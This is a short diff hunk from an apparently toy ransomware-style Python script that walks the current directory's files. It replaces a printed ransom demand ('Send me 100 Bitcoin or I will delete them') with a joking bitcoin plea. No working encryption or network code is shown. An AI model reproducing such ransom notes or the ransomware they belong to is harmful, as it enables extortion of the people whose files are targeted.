@@ -35,4 +35,4 @@ for root, dirs, files in os.walk('.'):
 
 print(files)
 
-print("All of your files have been encrypted!! Send me 100 Bitcoin or I will delete them in 24 hours... ")
+print("Toss a bitcoin to your hacker O' owner of this pc!")
